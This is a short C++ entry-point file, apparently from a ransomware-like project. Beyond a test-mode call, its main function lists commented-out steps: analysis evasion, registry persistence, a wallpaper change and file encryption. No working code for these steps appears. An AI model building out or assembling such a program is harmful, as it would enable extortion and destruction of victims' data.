// Loc.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#define TEST_MODE 1

#if TEST_MODE == 1
#include "tests/test.cpp"
#endif

int main(void) {
    #if TEST_MODE == 1 
    /*
        Evasion evasion;
        if (evasion.mustBeAvoided) {
            return 0xdeadbeef;
        }
    */
        start_testing();
        exit(0);
    #endif

    /*
    Evasion evasion;
    if (evasion.mustBeAvoided == 1) {
        return 0xdeadbeef;
    }
    */

    // Persistence persistence;
    //Persistence::RegistryKeyCreation();  
    
    /*
    Utils utils;
    utils.changeWallpaper();
    */

    /*
    Crypt crypt;
    crypt.startCrypt();

    */
    return EXIT_SUCCESS;
}